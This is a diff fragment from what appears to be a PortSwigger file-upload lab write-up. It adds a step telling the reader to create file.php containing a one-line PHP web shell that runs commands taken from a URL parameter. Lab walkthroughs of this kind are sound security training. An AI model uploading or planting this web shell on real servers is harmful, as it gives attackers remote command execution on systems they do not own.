@@ -20,3 +20,4 @@ Click on any of the blog posts. We can see that we have an option to upload file
 ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/907e5013-4590-426e-881f-71a47a4f85de)
 
 
+Create a file name `file.php` with the contents - `<?php echo system($_GET['command']); ?>`
